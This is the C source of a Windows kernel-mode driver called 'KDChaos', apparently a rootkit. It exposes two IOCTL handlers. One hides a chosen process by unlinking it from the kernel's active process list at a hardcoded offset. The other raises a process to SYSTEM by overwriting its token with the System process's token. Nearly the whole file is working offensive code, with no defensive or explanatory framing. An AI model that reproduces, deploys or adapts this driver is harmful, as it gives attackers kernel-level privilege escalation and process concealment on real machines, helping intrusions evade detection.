#include <ntifs.h>
#include <ntdef.h>
#include <minwindef.h>
#include <ntstrsafe.h>
#include <wdm.h>

#define HIDE_PROC CTL_CODE(FILE_DEVICE_UNKNOWN,0x45,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PRIVILEGE_ELEVATION CTL_CODE(FILE_DEVICE_UNKNOWN,0x90,METHOD_BUFFERED ,FILE_ANY_ACCESS)

UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\KDChaos");

UNICODE_STRING SymbName = RTL_CONSTANT_STRING(L"\\??\\KDChaos");

char* PsGetProcessImageFileName(PEPROCESS Process);

EX_PUSH_LOCK pLock;

int
PrivilegeElevationForProcess(
    int pid
)
{
    PVOID process = NULL;
    PVOID sys = NULL;
    PACCESS_TOKEN TargetToken;
    PACCESS_TOKEN sysToken;

    __try
    {

        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)pid, &process);

        if (ret != STATUS_SUCCESS)
        {
            if (ret == STATUS_INVALID_PARAMETER)
            {
                DbgPrint("the process ID was not found.");
            }
            if (ret == STATUS_INVALID_CID)
            {
                DbgPrint("the specified client ID is not valid.");
            }
            return (-1);
        }

        ret = PsLookupProcessByProcessId((HANDLE)0x4, &sys); // system handle

        if (ret != STATUS_SUCCESS)
        {
            if (ret == STATUS_INVALID_PARAMETER)
            {
                DbgPrint("system process ID was not found.");
            }
            if (ret == STATUS_INVALID_CID)
            {
                DbgPrint("the system ID is not valid.");
            }

            ObDereferenceObject(process);

            return (-1);
        }
        char* ImageName;

        DbgPrint("target process image name : %s \n", ImageName = PsGetProcessImageFileName((PEPROCESS)process));

        TargetToken = PsReferencePrimaryToken(process);

        if (!TargetToken)
        {
            ObDereferenceObject(sys);
            ObDereferenceObject(process);

            return (-1);
        }

        DbgPrint("%s token : %x\n", ImageName, TargetToken);

        sysToken = PsReferencePrimaryToken(sys);

        if (!sysToken)
        {
            ObDereferenceObject(sys);
            ObDereferenceObject(TargetToken);
            ObDereferenceObject(process);

            return (-1);
        }

        DbgPrint("system token : %x\n", sysToken);

        ULONG_PTR UniqueProcessIdAddress = (ULONG_PTR)process + 0x4b8;

        DbgPrint("%s token address  %x\n", ImageName, UniqueProcessIdAddress);

        unsigned long long  UniqueProcessId = *(PHANDLE)UniqueProcessIdAddress;


        ULONG_PTR sysadd = (ULONG_PTR)sys + 0x4b8;

        DbgPrint("system token address : %x\n", sysadd);

        unsigned long long  usysid = *(PHANDLE)sysadd;

        *(PHANDLE)UniqueProcessIdAddress = *(PHANDLE)sysadd;

        DbgPrint("process %s Token updated to  :%x ", ImageName, *(PHANDLE)(UniqueProcessIdAddress));

        for (int i = 1; i < 8; i++)
        {
            unsigned char f = *(PHANDLE)(UniqueProcessIdAddress + i);
            DbgPrint(" %x ", f);
        }

        DbgPrint("\n");
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return (-1);
    }

    ObDereferenceObject(sys);
    ObDereferenceObject(TargetToken);
    ObDereferenceObject(sysToken);
    ObDereferenceObject(process);

    return (0);
}

int 
HideProcess(
    int pid
)
{

    PVOID process = NULL;

    PLIST_ENTRY plist;
    __try
    {

        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)pid, (PEPROCESS *)&process);

        if (ret != STATUS_SUCCESS)
        {
            if (ret == STATUS_INVALID_PARAMETER)
            {
                DbgPrint("The process ID was not found.");
            }
            if (ret == STATUS_INVALID_CID)
            {
                DbgPrint("The specified client ID is not valid.");
            }
            return (-1);
        }

        plist = (PLIST_ENTRY)((char *)process + 0x448);

        ExAcquirePushLockExclusive(&pLock);

        if (plist->Flink == NULL || plist->Blink == NULL)
        {
            ExReleasePushLockExclusive(&pLock);
            __leave;
        }

        if (plist->Flink->Blink != plist || plist->Blink->Flink != plist)
        {
            ExReleasePushLockExclusive(&pLock);
            DbgPrint("Error: Inconsistent Flink and Blink pointers.");
            return (-1);
        }

        plist->Flink->Blink = plist->Blink;
        plist->Blink->Flink = plist->Flink;

        plist->Flink = NULL;
        plist->Blink = NULL;

        ExReleasePushLockExclusive(&pLock);

        DbgPrint("Process '%wZ' is now hidden", PsGetProcessImageFileName(process));
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        DbgPrint("An exception occurred while hiding the process.");
        return (-1);
    }

    ObDereferenceObject(process);
    return (0);
}

void
unloadv(
    PDRIVER_OBJECT driverObject
)
{
    IoDeleteSymbolicLink(&SymbName);

    IoDeleteDevice(driverObject->DeviceObject);

    DbgPrint("Driver Unloaded\n");
}


NTSTATUS processIoctlRequest(
    DEVICE_OBJECT* DeviceObject,
    IRP* Irp
)
{
    PIO_STACK_LOCATION  pstack = IoGetCurrentIrpStackLocation(Irp);

    int pstatus = 0;
    int inputInt = 0;

    if (pstack->Parameters.DeviceIoControl.IoControlCode == HIDE_PROC)
    {

        RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

        pstatus = HideProcess(inputInt);

        DbgPrint("Received input value: %d\n", inputInt);
    }

    if (pstack->Parameters.DeviceIoControl.IoControlCode == PRIVILEGE_ELEVATION)
    {
    
        RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));

        pstatus = PrivilegeElevationForProcess(inputInt);

        DbgPrint("Received input value: %d\n", inputInt);
    }
    memcpy(Irp->AssociatedIrp.SystemBuffer, &pstatus, sizeof(pstatus));

    Irp->IoStatus.Status = 0;

    Irp->IoStatus.Information = sizeof(int);

    IoCompleteRequest(Irp, IO_NO_INCREMENT);
}

void IRP_MJCreate()
{
    DbgPrint("IRP_CREATED\n");

}

void IRP_MJClose()
{ 
    DbgPrint("IRP_CLOSED");

}

NTSTATUS
DriverEntry(
    PDRIVER_OBJECT driverObject,
    PUNICODE_STRING registryPath
)
{
    DbgPrint("Driver Loaded\n");
    ExInitializePushLock(&pLock);
    UNREFERENCED_PARAMETER(registryPath);
    UNREFERENCED_PARAMETER(driverObject);

    driverObject->DriverUnload = &unloadv;
    driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = processIoctlRequest;
    driverObject->MajorFunction[IRP_MJ_CREATE] = IRP_MJCreate;
    driverObject->MajorFunction[IRP_MJ_CLOSE] = IRP_MJClose;

    IoCreateDevice(driverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, METHOD_BUFFERED, FALSE, &driverObject->DeviceObject);
    IoCreateSymbolicLink(&SymbName, &DeviceName);

    return (STATUS_SUCCESS);
}
